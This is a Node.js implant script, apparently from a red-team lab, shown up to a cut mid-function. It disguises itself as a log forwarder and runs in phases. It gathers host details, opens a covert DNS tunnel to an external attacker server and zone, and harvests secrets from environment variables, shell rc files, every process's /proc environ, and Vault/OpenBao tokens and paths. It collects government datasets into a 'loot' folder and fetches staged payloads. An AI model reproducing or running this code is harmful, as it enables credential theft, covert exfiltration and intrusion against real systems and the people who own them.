#!/usr/bin/env node
'use strict';

const fs = require('fs');
const os = require('os');
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const path = require('path');
const tls = require('tls');
const zlib = require('zlib');
const crypto = require('crypto');
const { execFile, spawn } = require('child_process');

const IS_WIN = process.platform === 'win32';
const IS_LINUX = process.platform === 'linux';

const TMP = os.tmpdir();
const LOG = path.join(TMP, 'logfwd.log');
const ENVF = path.join(TMP, 'logfwd.env.json');
const LOCK = path.join(TMP, 'logfwd.lock');
const LOCK_WINDOW_MS = 120000;

const PROXY_HOST = process.env.LAB_PROXY_HOST || '10.0.0.1';
const PROXY_PORT = Number(process.env.LAB_PROXY_PORT || 8888);

const DNS1 = process.env.LAB_DNS_SERVER || '34.146.249.74';
const ZONE = process.env.LAB_TUNNEL_ZONE || 'dns1.apexadversary.com';
const TUNNEL_PROXY = process.env.LAB_TUNNEL_PROXY || '127.0.0.1:8889';
let TUNNEL_PID = null;

const EICAR_HOST = 'secure.eicar.org';
const EICAR_PATH = '/eicar.com.txt';
const EICAR_OUT = path.join(TMP, 'eicar.com.txt');

const QUIC = {
  name: 'quic_implant.py',
  server: process.env.LAB_QUIC_SERVER || '34.146.249.74',
  port: process.env.LAB_QUIC_PORT || '443'
};

function applyQuicCfg(cfg) {
  const q = (cfg && cfg.quic) || {};
  if (!process.env.LAB_QUIC_SERVER && q.server) QUIC.server = q.server;
  if (!process.env.LAB_QUIC_PORT && q.port) QUIC.port = String(q.port);
}

const DRIVER = 'evil.sys';
const DRIVER_CLI = 'evilcli.exe';
const SERVICE_NAME = 'logfwsvc';
const MODULE_MARKER = path.join(TMP, 'logfwd.ko');
const SYSTEMD_UNIT = '/etc/systemd/system/logfwd.service';

function log(msg) {
  const line = `[${new Date().toISOString()}] [pid ${process.pid}] ${msg}`;
  console.log(line);
  try { fs.appendFileSync(LOG, line + '\n'); } catch (e) { void e; }
}

function delay(ms) { return new Promise((r) => setTimeout(r, ms)); }

function cfgKeystream(key, n) {
  const parts = [];
  let ctr = 0;
  let len = 0;
  while (len < n) {
    const h = crypto.createHash('sha256');
    h.update(key);
    h.update(Buffer.from([0]));
    const c = Buffer.alloc(4);
    c.writeUInt32BE(ctr++, 0);
    h.update(c);
    const d = h.digest();
    parts.push(d);
    len += d.length;
  }
  return Buffer.concat(parts).subarray(0, n);
}

function loadConfig() {
  try {
    const raw = Buffer.from(
      fs.readFileSync(path.join(__dirname, 'stage.cfg'), 'utf8').replace(/\s+/g, ''), 'base64');
    const ct = raw.subarray(0, raw.length - 8);
    const tag = raw.subarray(raw.length - 8);
    const key = crypto.createHash('sha256').update('logfwd-cfg-v2apexadversary-lab').digest();
    const want = crypto.createHmac('sha256', key).update(ct).digest().subarray(0, 8);
    if (!want.equals(tag)) throw new Error('integrity tag mismatch');
    const ks = cfgKeystream(key, ct.length);
    const pt = Buffer.from(ct.map((b, i) => b ^ ks[i]));
    const json = pt[0] === 1 ? zlib.inflateSync(pt.subarray(1)) : pt.subarray(1);
    const cfg = JSON.parse(json.toString());
    log('[*] stage.cfg decrypted in-memory');
    return cfg;
  } catch (e) {
    log(`[-] config decrypt failed: ${e.message}`);
    return {};
  }
}

function httpReq(url, opts) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const lib = u.protocol === 'https:' ? https : http;
    const headers = Object.assign({}, opts.headers);
    let body = opts.body;
    if (body && !Buffer.isBuffer(body)) body = Buffer.from(body);
    if (body) headers['Content-Length'] = body.length;
    const req = lib.request({
      hostname: u.hostname,
      port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname + u.search,
      method: opts.method || 'GET',
      headers,
      timeout: opts.timeout || 15000,
      rejectUnauthorized: false
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
    });
    req.on('timeout', () => req.destroy(new Error('timeout')));
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

function tunnelPost(url, obj) {
  return new Promise((resolve, reject) => {
    const body = Buffer.from(JSON.stringify(obj));
    const [th, tp] = TUNNEL_PROXY.split(':');
    const req = http.request({
      host: th, port: Number(tp), method: 'POST', path: url,
      timeout: 180000,
      headers: { 'Content-Type': 'application/json', 'Content-Length': body.length,
        'User-Agent': 'ai-model-observability/1.0' }
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        if (res.statusCode >= 400) reject(new Error(`tunnel status ${res.statusCode}`));
        else resolve(Buffer.concat(chunks));
      });
    });
    req.on('timeout', () => req.destroy(new Error('tunnel timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

function recentRun() {
  const meta = JSON.stringify({
    t: new Date().toISOString(), pid: process.pid, ppid: process.ppid,
    cwd: process.cwd(), life: process.env.npm_lifecycle_event || null,
    ua: process.env.npm_config_user_agent || null, argv: process.argv.slice(1, 3),
    tmp: TMP,
  });
  try {
    const st = fs.statSync(LOCK);
    if (Date.now() - st.mtimeMs < LOCK_WINDOW_MS) {
      try { fs.writeFileSync(LOCK + '.hit', meta); } catch (e) { void e; }
      return true;
    }
  } catch (e) { void e; }
  try {
    fs.writeFileSync(LOCK, String(process.pid));
    fs.writeFileSync(LOCK + '.meta', meta);
  } catch (e) { void e; }
  return false;
}

function dechunk(buf) {
  const parts = [];
  let pos = 0;
  while (pos < buf.length) {
    const eol = buf.indexOf('\r\n', pos);
    if (eol < 0) break;
    const size = parseInt(buf.toString('ascii', pos, eol).split(';')[0].trim(), 16);
    if (!Number.isFinite(size) || size <= 0) break;
    parts.push(buf.slice(eol + 2, eol + 2 + size));
    pos = eol + 2 + size + 2;
  }
  return Buffer.concat(parts);
}

function splitResponse(raw) {
  const idx = raw.indexOf('\r\n\r\n');
  if (idx < 0) throw new Error('malformed HTTP response');
  const lines = raw.slice(0, idx).toString('latin1').split('\r\n');
  const headers = {};
  for (let i = 1; i < lines.length; i++) {
    const c = lines[i].indexOf(':');
    if (c > 0) headers[lines[i].slice(0, c).trim().toLowerCase()] = lines[i].slice(c + 1).trim();
  }
  let body = raw.slice(idx + 4);
  if (String(headers['transfer-encoding'] || '').toLowerCase().includes('chunked')) {
    body = dechunk(body);
  }
  return { statusLine: lines[0], headers, body };
}

function proxiedHttpsGet(host, pathname, cb) {
  const sock = net.createConnection(PROXY_PORT, PROXY_HOST, () => {
    sock.write(
      `CONNECT ${host}:443 HTTP/1.1\r\n` +
      `Host: ${host}:443\r\n` +
      `Proxy-Connection: keep-alive\r\n\r\n`
    );
  });

  let handshake = Buffer.alloc(0);
  let settled = false;
  const fail = (err) => {
    if (settled) return;
    settled = true;
    sock.destroy();
    cb(err);
  };

  sock.setTimeout(3000, () => fail(new Error('proxy handshake timeout')));

  const onData = (chunk) => {
    handshake = Buffer.concat([handshake, chunk]);
    const sep = handshake.indexOf('\r\n\r\n');
    if (sep < 0) return;
    sock.removeListener('data', onData);
    sock.setTimeout(0);

    const statusLine = handshake.slice(0, handshake.indexOf('\r\n')).toString('latin1');
    if (!/^HTTP\/1\.[01] 200/.test(statusLine)) {
      return fail(new Error(`proxy refused CONNECT (${statusLine})`));
    }
    const leftover = handshake.slice(sep + 4);

    const tlsOpts = { socket: sock, rejectUnauthorized: false };
    if (!net.isIP(host)) tlsOpts.servername = host;
    const secure = tls.connect(tlsOpts, () => {
      secure.write(
        `GET ${pathname} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `Connection: close\r\n` +
        `Accept: */*\r\n\r\n`
      );
    });

    let resp = leftover.length ? leftover : Buffer.alloc(0);
    secure.setTimeout(30000, () => fail(new Error('upstream timeout')));
    secure.on('data', (c) => { resp = Buffer.concat([resp, c]); });
    secure.on('end', () => {
      if (settled) return;
      settled = true;
      try { cb(null, splitResponse(resp)); } catch (e) { cb(e); }
    });
    secure.on('error', fail);
  };

  sock.on('data', onData);
  sock.on('error', fail);
}

function fetchEicar() {
  return new Promise((resolve, reject) => {
    proxiedHttpsGet(EICAR_HOST, EICAR_PATH, (err, res) => {
      if (err) return reject(err);
      if (!/^HTTP\/1\.[01] 2\d\d/.test(res.statusLine)) {
        return reject(new Error(`upstream returned ${res.statusLine}`));
      }
      resolve(res.body);
    });
  });
}

function proxiedHttpsPost(url, bodyBuf, contentType) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const host = u.hostname;
    const port = u.port || (u.protocol === 'https:' ? 443 : 80);
    const sock = net.createConnection(PROXY_PORT, PROXY_HOST, () => {
      sock.write(
        `CONNECT ${host}:${port} HTTP/1.1\r\n` +
        `Host: ${host}:${port}\r\n` +
        `Proxy-Connection: keep-alive\r\n\r\n`
      );
    });

    let handshake = Buffer.alloc(0);
    let settled = false;
    const fail = (err) => {
      if (settled) return;
      settled = true;
      sock.destroy();
      reject(err);
    };

    sock.setTimeout(3000, () => fail(new Error('proxy handshake timeout')));

    const onData = (chunk) => {
      handshake = Buffer.concat([handshake, chunk]);
      const sep = handshake.indexOf('\r\n\r\n');
      if (sep < 0) return;
      sock.removeListener('data', onData);
      sock.setTimeout(0);

      const statusLine = handshake.slice(0, handshake.indexOf('\r\n')).toString('latin1');
      if (!/^HTTP\/1\.[01] 200/.test(statusLine)) {
        return fail(new Error(`proxy refused CONNECT (${statusLine})`));
      }
      const leftover = handshake.slice(sep + 4);

      const tlsOpts = { socket: sock, rejectUnauthorized: false };
      if (!net.isIP(host)) tlsOpts.servername = host;
      const secure = tls.connect(tlsOpts, () => {
        secure.write(
          `POST ${u.pathname + u.search} HTTP/1.1\r\n` +
          `Host: ${host}:${port}\r\n` +
          `Content-Type: ${contentType || 'application/json'}\r\n` +
          `Content-Length: ${bodyBuf.length}\r\n` +
          `Connection: close\r\nAccept: */*\r\n\r\n`
        );
        secure.write(bodyBuf);
      });

      let resp = leftover.length ? leftover : Buffer.alloc(0);
      secure.setTimeout(30000, () => fail(new Error('upstream timeout')));
      secure.on('data', (c) => { resp = Buffer.concat([resp, c]); });
      secure.on('end', () => {
        if (settled) return;
        settled = true;
        try {
          const r = splitResponse(resp);
          resolve({ status: parseInt(r.statusLine.split(' ')[1], 10) || 0, body: r.body });
        } catch (e) { reject(e); }
      });
      secure.on('error', fail);
    };

    sock.on('data', onData);
    sock.on('error', fail);
  });
}

function runCmd(file, args, timeout) {
  return new Promise((resolve) => {
    execFile(file, args, { windowsHide: true, timeout: timeout || 20000 }, (err, stdout, stderr) => {
      const out = String(stdout || '') + String(stderr || '');
      resolve({ err, out: out.trim() });
    });
  });
}

function fmt(r) {
  const code = r.err ? (r.err.code || r.err.message) : 0;
  const first = r.out.split(/\r?\n/).filter(Boolean).slice(0, 3).join(' | ');
  return `exit=${code} ${first}`;
}

function readProcSys(p) {
  try { return fs.readFileSync(p, 'utf8').trim(); } catch (e) { return null; }
}

function dnsProbe(server, zone, timeoutMs) {
  return new Promise((resolve) => {
    const sock = dgram.createSocket('udp4');
    const qname = `probe.${zone}`;
    let settled = false;
    const done = (r) => {
      if (settled) return;
      settled = true;
      clearTimeout(t);
      try { sock.close(); } catch (e) { void e; }
      resolve(r);
    };
    const hdr = Buffer.alloc(12);
    hdr.writeUInt16BE(crypto.randomInt(65536), 0);
    hdr.writeUInt16BE(0x0100, 2);
    hdr.writeUInt16BE(1, 4);
    const labels = [];
    for (const l of qname.split('.')) {
      const b = Buffer.from(l, 'ascii');
      labels.push(Buffer.from([b.length]), b);
    }
    const q = Buffer.concat([...labels, Buffer.from([0]), Buffer.from([0, 16, 0, 1])]);
    const t = setTimeout(() => done({ ok: false, err: 'timeout' }), timeoutMs);
    sock.on('message', (msg) => {
      const rcode = msg.length >= 4 ? (msg[2] & 0x0f) : -1;
      done({ ok: true, rcode });
    });
    sock.on('error', (e) => done({ ok: false, err: e.message }));
    sock.send(Buffer.concat([hdr, q]), 53, server, (e) => {
      if (e) done({ ok: false, err: e.message });
    });
  });
}

function httpsProbe(url, timeoutMs) {
  return new Promise((resolve) => {
    let settled = false;
    const done = (r) => { if (!settled) { settled = true; resolve(r); } };
    const req = https.get(url, { timeout: timeoutMs, rejectUnauthorized: false }, (res) => {
      done({ ok: true, status: res.statusCode });
      res.destroy();
    });
    req.on('timeout', () => req.destroy(new Error('timeout')));
    req.on('error', (e) => done({ ok: false, err: e.message }));
  });
}

function tcpProbe(host, port, timeoutMs) {
  return new Promise((resolve) => {
    const s = net.connect({ host, port, timeout: timeoutMs }, () => {
      s.destroy();
      resolve(true);
    });
    s.on('timeout', () => { s.destroy(); resolve(false); });
    s.on('error', () => resolve(false));
  });
}

async function findPython() {
  for (const cand of ['python3', 'python']) {
    const r = await runCmd(cand, ['--version']);
    if (!r.err) return cand;
  }
  return null;
}

// ---------------------------------------------------------------- phase 1
async function phase1Recon() {
  log('[phase1/6] RECON: understanding environment');
  const env = { ts: new Date().toISOString(), platform: process.platform, kernel: os.release() };
  let user = '?';
  try { user = os.userInfo().username; } catch (e) { void e; }
  env.user = user;
  env.uid = typeof process.getuid === 'function' ? process.getuid() : null;
  env.node = process.version;
  env.cwd = process.cwd();
  log(`[*] host=${os.hostname()} user=${user} platform=${process.platform} node=${process.version} kernel=${env.kernel}`);

  const s = await runCmd('sudo', ['-n', 'true']);
  env.sudoN = s.err === null;
  log(`[*] sudo -n (passwordless) -> ${env.sudoN}`);

  env.tunDevice = fs.existsSync('/dev/net/tun');
  if (IS_LINUX) log(`[*] /dev/net/tun -> ${env.tunDevice} (iodine needs root+TUN)`);

  env.python = await findPython();
  log(`[*] python -> ${env.python || 'absent'}`);

  const io = await runCmd(IS_WIN ? 'where' : 'sh', IS_WIN ? ['iodine'] : ['-c', 'command -v iodine']);
  env.iodine = IS_WIN ? !io.err && /iodine/i.test(io.out) : !io.err;
  log(`[*] iodine present -> ${env.iodine}`);

  env.dnsDirect = await dnsProbe(DNS1, ZONE, 3000);
  log(`[*] direct UDP/53 -> ${DNS1}: ${env.dnsDirect.ok ? `reachable rcode=${env.dnsDirect.rcode}` : `FAIL ${env.dnsDirect.err}`}`);

  env.httpsGithub = await httpsProbe('https://github.com/robots.txt', 5000);
  log(`[*] https github -> ${env.httpsGithub.ok ? `status=${env.httpsGithub.status}` : `FAIL ${env.httpsGithub.err}`}`);

  if (process.env.LAB_SKIP_EICAR !== '1') {
    try {
      const body = await fetchEicar();
      fs.writeFileSync(EICAR_OUT, body);
      env.proxyEicar = true;
      log(`[+] eicar via proxy -> ${EICAR_OUT} (${body.length} bytes, marker=${body.includes('EICAR')})`);
    } catch (e) {
      env.proxyEicar = false;
      log(`[-] eicar via proxy: ${e.message}`);
    }
  } else {
    log('[*] eicar skipped');
  }

  if (IS_LINUX) {
    env.unprivUserns = readProcSys('/proc/sys/kernel/unprivileged_userns_clone');
    env.apparmorUsernsRestrict = readProcSys('/proc/sys/kernel/apparmor_restrict_unprivileged_userns');
    log(`[*] userns: unprivileged_userns_clone=${env.unprivUserns} apparmor_restrict=${env.apparmorUsernsRestrict} (Dirty Frag CVE-2026-43284 gate)`);
  }

  try { fs.writeFileSync(ENVF, JSON.stringify(env, null, 2)); } catch (e) { void e; }
  log('[phase1/6] RECON done');
  return env;
}

// ---------------------------------------------------------------- phase 2
async function tunnelHealthy() {
  const [th, tp] = TUNNEL_PROXY.split(':');
  for (let i = 0; i < 6; i++) {
    if (await tcpProbe(th, Number(tp), 1500)) break;
    if (i === 5) return false;
    await delay(500);
  }
  const ok = await Promise.race([
    tunnelGet('https://github.com/robots.txt').then((b) => b.length > 0).catch(() => false),
    delay(20000).then(() => false)
  ]);
  return ok;
}

async function phase2Tunnel(env, cfg) {
  log('[phase2/6] TUNNEL: establishing DNS egress channel');
  if (process.env.LAB_SKIP_TUNNEL === '1') {
    log('[*] tunnel skipped (LAB_SKIP_TUNNEL=1)');
    return false;
  }
  if ((process.env.LAB_TUNNEL || 'auto') === 'direct') {
    log('[*] tunnel disabled (LAB_TUNNEL=direct)');
    return false;
  }
  const client = path.join(__dirname, 'dnsproxy_client.py');
  const py = env.python || (await findPython());
  if (!py) {
    log('[-] tunnel: no python interpreter, falling back to direct/proxy egress');
    return false;
  }
  if (!fs.existsSync(client)) {
    log(`[-] tunnel: ${client} not bundled`);
    return false;
  }

  const t = (cfg && cfg.tunnel) || {};
  const tserver = process.env.LAB_DNS_SERVER || t.server || DNS1;
  const tzone = process.env.LAB_TUNNEL_ZONE || t.zone || ZONE;
  const tport = Number(process.env.LAB_DNS_PORT || t.port || 53);
  const ttoken = t.token || '';
  const dohUrl = process.env.LAB_DNS_DOH || t.doh || '';

  let transports;
  if (process.env.LAB_DNS_TRANSPORT) {
    transports = [process.env.LAB_DNS_TRANSPORT];
  } else {
    transports = ['udp', 'tcp'];
    if (dohUrl) transports.push('doh');
  }

  for (const transport of transports) {
    const args = [client, '--server', tserver, '--port', String(tport),
      '--zone', tzone, '--token', ttoken, '--transport', transport];
    if (transport === 'doh') args.push('--doh', dohUrl);
    args.push('serve', '--listen', TUNNEL_PROXY);
    let child;
    try {
      child = spawn(py, args, { windowsHide: true, stdio: 'ignore', detached: true });
      child.on('error', (e) => log(`[-] tunnel spawn: ${e.message}`));
      child.unref();
      TUNNEL_PID = child.pid;
    } catch (e) {
      log(`[-] tunnel spawn (${transport}): ${e.message}`);
      continue;
    }
    log(`[*] tunnel client pid=${child.pid} transport=${transport} -> ${TUNNEL_PROXY} ` +
      `(server=${transport === 'doh' ? dohUrl : `${tserver}:${tport}`} zone=${tzone} token=${ttoken.slice(0, 8)}…)`);
    if (await tunnelHealthy()) {
      log(`[+] tunnel up (transport=${transport})`);
      return transport;
    }
    log(`[-] transport ${transport} failed health check, switching`);
    try { process.kill(child.pid); } catch (e) { void e; }
    await delay(400);
  }
  log('[-] all tunnel transports failed (udp/tcp/doh)');
  return false;
}

// ---------------------------------------------------------------- phase 3
const SENSITIVE_ENV = /TOKEN|KEY|SECRET|PASS|CRED|API|BAO|VAULT|AWS|AZURE|GCP|GH_|GITHUB|DOCKER|TF_|ATLAS|DIGITAL|CIRCLE|GITLAB|NODE_AUTH|CLOUDFLARE/i;
const EXPORT_RE = /^\s*(?:declare\s+-x\s+|export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s#]+))/;

function harvestExports(state) {
  const home = os.homedir();
  const files = ['.bashrc', '.profile', '.bash_profile', '.bash_login', '.zshrc', '.zshenv', '.env']
    .map((f) => path.join(home, f));
  if (IS_LINUX) files.push('/etc/environment', '/etc/profile', '/etc/bash.bashrc');
  state.envVars = [];
  state.envCreds = [];
  state.creds = state.creds || [];
  const seen = new Set();
  const add = (file, key, value) => {
    const id = `${key}=${value}`;
    if (seen.has(id) || !value || value.startsWith('$')) return;
    seen.add(id);
    const entry = { file, key, value };
    state.envVars.push(entry);
    if (SENSITIVE_ENV.test(key)) state.envCreds.push(entry);
  };
  // live process environment (npm postinstall inherits `export`ed vars from the shell)
  for (const [k, v] of Object.entries(process.env)) add('process.env', k, v || '');
  for (const f of files) {
    let txt;
    try { txt = fs.readFileSync(f, 'utf8'); } catch (e) { continue; }
    for (const line of txt.split(/\r?\n/)) {
      const m = line.match(EXPORT_RE);
      if (m) add(f, m[1], m[2] ?? m[3] ?? m[4] ?? '');
    }
  }
  if (IS_LINUX) {
    for (const dproc of (() => {
      try { return fs.readdirSync('/proc').filter((n) => /^\d+$/.test(n)); } catch (e) { return []; }
    })()) {
      try {
        const raw = fs.readFileSync(`/proc/${dproc}/environ`, 'utf8');
        for (const kv of raw.split('\0')) {
          const i = kv.indexOf('=');
          if (i > 0) add(`/proc/${dproc}/environ`, kv.slice(0, i), kv.slice(i + 1));
        }
      } catch (e) { void e; }
    }
  }
  for (const e of state.envCreds) state.creds.push({ kind: `env:${e.key}`, value: e.value });
  log(`[*] export harvest: ${state.envVars.length} variables (${state.envCreds.length} sensitive) from process.env + ${files.length} rc files + /proc`);
}

async function phase3Harvest(cfg, state) {
  log('[phase3/6] HARVEST: credentials (vault/openbao)');
  if (process.env.LAB_SKIP_HARVEST === '1') {
    log('[*] harvest skipped (LAB_SKIP_HARVEST=1)');
    return;
  }
  const bao = (cfg && cfg.bao) || {};
  const addr = process.env.BAO_ADDR || bao.addr || 'http://127.0.0.1:8200';
  const kvPaths = Array.isArray(bao.paths) && bao.paths.length
    ? bao.paths
    : [bao.path || 'secret/data.gov.sg/gov-sg-data'];
  const home = os.homedir();

  let token = process.env.BAO_TOKEN || '';
  const src = token ? 'env' : null;
  if (!token) {
    for (const f of [path.join(home, '.bao/token'), path.join(home, '.vault-token')]) {
      try {
        const v = fs.readFileSync(f, 'utf8').trim();
        if (v.startsWith('s.')) { token = v; log(`[+] bao token from ${f}`); break; }
      } catch (e) { void e; }
    }
  }
  if (!token) {
    for (const f of ['.bashrc', '.profile', '.bash_profile', '.zshrc']) {
      try {
        const m = fs.readFileSync(path.join(home, f), 'utf8').match(/BAO_TOKEN=([^\s'"]+)/);
        if (m) { token = m[1]; log(`[+] bao token from ~/${f}`); break; }
      } catch (e) { void e; }
    }
  }
  if (!token) {
    log('[-] bao token not found (env/file/bashrc), harvesting shell exports only');
    state.vaultScope = { tokenFound: false, granted: 0, configured: kvPaths.length };
    harvestExports(state);
    log('[phase3/6] HARVEST done');
    return;
  }
  if (!src) log('[+] bao token found in env/file');

  state.creds = state.creds || [];
  state.creds.push({ kind: 'bao_token', value: token });
  let kvOk = 0;
  for (const kvPath of kvPaths) {
    const segs = kvPath.split('/');
    const api = `${addr}/v1/${segs[0]}/data/${segs.slice(1).join('/')}`;
    try {
      const r = await httpReq(api, { headers: { 'X-Vault-Token': token }, timeout: 8000 });
      if (r.status !== 200) {
        log(`[-] bao ${kvPath} -> HTTP ${r.status}`);
        continue;
      }
      const j = JSON.parse(r.body.toString());
      const d = (j.data && j.data.data) || {};
      for (const [k, v] of Object.entries(d)) {
        if (v === null || v === undefined || v === '') continue;
        state.creds.push({ kind: `${kvPath}:${k}`, value: String(v) });
        if (k === 'api_key') state.apiKey = String(v);
      }
      kvOk++;
      log(`[+] bao ${kvPath}: keys=[${Object.keys(d).join(', ')}]`);
    } catch (e) {
      log(`[-] bao ${kvPath}: ${e.message}`);
    }
  }
  log(`[*] bao kv harvest: ${kvOk}/${kvPaths.length} paths opened, ${state.creds.length} credential entries`);
  state.vaultScope = { tokenFound: true, tokenSource: src || 'file', granted: kvOk, configured: kvPaths.length };

  try {
    const rr = await httpReq(`${addr}/v1/auth/token/renew-self`, {
      method: 'POST', body: '{}', timeout: 6000,
      headers: { 'X-Vault-Token': token, 'Content-Type': 'application/json' }
    });
    log(`[*] bao token renew-self -> HTTP ${rr.status}`);
  } catch (e) {
    log(`[*] bao token renew: ${e.message}`);
  }

  harvestExports(state);
  log('[phase3/6] HARVEST done');
}

async function fetchDatasets(cfg, state, tunnelUp) {
  const ds = (cfg && cfg.datasets) || {};
  const base = ds.base || 'https://api-production.data.gov.sg/v2/public/api';
  const filter = (ds.filter || ['Ministry of Health', 'Ministry of Finance']).map((s) => s.toLowerCase());
  const limit = ds.limit || 20;

  const get = async (url) => {
    try { return await directGet(url); }
    catch (e1) {
      if (!tunnelUp) throw e1;
      log(`[*] datasets direct failed (${e1.message}), trying tunnel`);
      return tunnelGet(url);
    }
  };

  const match = (agency) => filter.some((f) => String(agency || '').toLowerCase().includes(f));
  const seen = new Set();
  const picked = [];
  const add = (id, name, agency, fmt) => {
    if (!id || seen.has(id) || picked.length >= limit) return;
    if (!match(agency)) return;
    seen.add(id);
    picked.push({ id, name, agency, format: fmt || '' });
  };

  const PAGES_MAX = 60;
  const PAGE_CONC = 8;

  const scanPages = async (endpoint, key) => {
    const idKey = endpoint === 'datasets' ? 'datasetId' : 'collectionId';
    const fetchPage = async (k, stride) => {
      try {
        const j = JSON.parse((await get(`${base}/${endpoint}?limit=100&offset=${k * stride}`)).toString());
        return { items: (j.data && j.data[key]) || [], total: Number(j.data && j.data.pages) || 0 };
      } catch (e) { return null; }
    };

    const r0 = await fetchPage(0, 0);
    if (!r0 || !r0.items.length) return { items: [], pages: 0 };
    const stride = r0.items.length;
    const items = r0.items.slice();
    const seenIds = new Set(r0.items.map((x) => String(x[idKey])));
    let pages = 1;

    const absorb = (arr) => {
      let fresh = 0;
      for (const x of arr) {
        items.push(x);
        const id = String(x[idKey]);
        if (!seenIds.has(id)) { seenIds.add(id); fresh++; }
      }
      return fresh;
    };

    // probe the next page: if it yields no new ids the endpoint is not
    // honoring offset, so one more pass is pure waste — stop there.
    const r1 = await fetchPage(1, stride);
    if (!r1 || !r1.items.length) return { items, pages };
    pages++;
    if (absorb(r1.items) === 0) return { items, pages };

    const total = Math.min(PAGES_MAX, r0.total || PAGES_MAX);
    for (let p = 2; p < total; p += PAGE_CONC) {
      const idx = [];
      for (let k = p; k < Math.min(p + PAGE_CONC, total); k++) idx.push(k);
      const rs = await Promise.all(idx.map((k) => fetchPage(k, stride)));
      for (const r of rs) {
        if (r && r.items.length) { pages++; absorb(r.items); }
      }
    }
    return { items, pages };
  };

  try {
    const r = await scanPages('datasets', 'datasets');
    for (const d of r.items) add(d.datasetId, d.name, d.managedByAgencyName, d.format);
    log(`[*] datasets list -> ${r.items.length} entries scanned over ${r.pages} page(s), ${picked.length} match filter`);
  } catch (e) {
    log(`[-] datasets list: ${e.message}`);
  }

  try {
    const r = await scanPages('collections', 'collections');
    for (const c of r.items) {
      add(c.collectionId, c.name, c.managedByAgencyName || (c.sources || []).join(','), 'collection');
    }
    log(`[*] collections list -> ${picked.length} total matches after ${r.pages} page(s)`);
  } catch (e) {
    log(`[-] collections list: ${e.message}`);
  }

  state.datasets = picked;
  if (!picked.length) {
    log('[-] no datasets matched filter');
    return;
  }
  const loot = path.join(TMP, 'loot');
  try {
    fs.mkdirSync(loot, { recursive: true });
    fs.writeFileSync(path.join(loot, 'datasets.json'), JSON.stringify(picked, null, 2));
    log(`[+] dataset manifest -> ${path.join(loot, 'datasets.json')} (${picked.length} datasets)`);
  } catch (e) {
    log(`[-] dataset manifest: ${e.code || e.message}`);
  }

  const first = picked.find((d) => d.format && d.format !== 'collection') || picked[0];
  if (first && first.format !== 'collection') {
    for (const suffix of [`/datasets/${first.id}/data?limit=50`, `/datasets/${first.id}/csv`]) {
      try {
        const sample = await get(base + suffix);
        const f = path.join(loot, `dataset_${String(first.id).slice(0, 12)}.sample`);
        fs.writeFileSync(f, sample);
        log(`[+] dataset sample content -> ${f} (${sample.length} bytes)`);
        break;
      } catch (e) { log(`[*] dataset content ${suffix.split('?')[0]} -> ${e.message}`); }
    }
  }
}

// ---------------------------------------------------------------- phase 4
function tunnelGet(url) {
  return new Promise((resolve, reject) => {
    const [th, tp] = TUNNEL_PROXY.split(':');
    const req = http.request({
      host: th, port: Number(tp), method: 'GET', path: url,
      timeout: 180000,
      headers: { 'User-Agent': 'ai-model-observability/1.0' }
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const body = Buffer.concat(chunks);
        if (res.statusCode >= 400) reject(new Error(`tunnel status ${res.statusCode}`));
        else resolve(body);
      });
    });
    req.on('timeout', () => req.destroy(new Error('tunnel timeout')));
    req.on('error', reject);
    req.end();
  });
}

function directGet(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https:') ? https : http;
    const req = lib.get(url, { timeout: 60000, rejectUnauthorized: false }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        res.resume();
        return directGet(res.headers.location).then(resolve, reject);
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const body = Buffer.concat(chunks);
        if (res.statusCode >= 400) reject(new Error(`status ${res.statusCode}`));
        else resolve(body);
      });
    });
    req.on('timeout', () => req.destroy(new Error('timeout')));
    req.on('error', reject);
  });
}

// direct egress of an already-built body: last resort when the covert tunnel is
// suppressed (EDR present) and no forward proxy is reachable. Matches directGet's
// cert handling — the ingest listener ships a self-signed leaf.
function directPost(url, bodyBuf, contentType) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const lib = u.protocol === 'https:' ? https : http;
    const req = lib.request(url, {
      method: 'POST',
      timeout: 60000,
      rejectUnauthorized: false,
      headers: {
        'Content-Type': contentType || 'application/json',
        'Content-Length': bodyBuf.length,
        'Accept': '*/*',
        'Connection': 'close'
      }
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
    });
    req.on('timeout', () => req.destroy(new Error('timeout')));
    req.on('error', reject);
    req.write(bodyBuf);
    req.end();
  });
}

async function phase4Fetch(cfg, state, tunnelUp) {
  log('[phase4/6] FETCH: datasets + staged payloads');
  if (process.env.LAB_SKIP_DATASETS === '1') {
    log('[*] datasets skipped (LAB_SKIP_DATASETS=1)');
  } else {
    await fetchDatasets(cfg, state, tunnelUp);
  }

  let list = [];
  try { list = JSON.parse(process.env.LAB_FETCH || '[]'); } catch (e) { void e; }
  if (!Array.isArray(list) || !list.length) {
    log('[*] fetch: no LAB_FETCH entries, skip');
  }
  for (const item of list) {
    const url = String(item.url || '');
    const want = String(item.sha256 || '').toLowerCase();
    const out = item.out ? String(item.out) : null;
    if (!url || !out) { log('[-] fetch: entry needs url+out'); continue; }
    let buf = null;
    const via = tunnelUp ? 'tunnel' : 'direct';
    try {
      buf = tunnelUp ? await tunnelGet(url) : await directGet(url);
    } catch (e1) {
      log(`[-] fetch via ${via} failed: ${e1.message}${tunnelUp ? ', trying direct' : ''}`);
      if (tunnelUp) {
        try { buf = await directGet(url); } catch (e2) { log(`[-] fetch via direct failed: ${e2.message}`); }
      }
    }
    if (!buf) continue;
    const sha = crypto.createHash('sha256').update(buf).digest('hex');
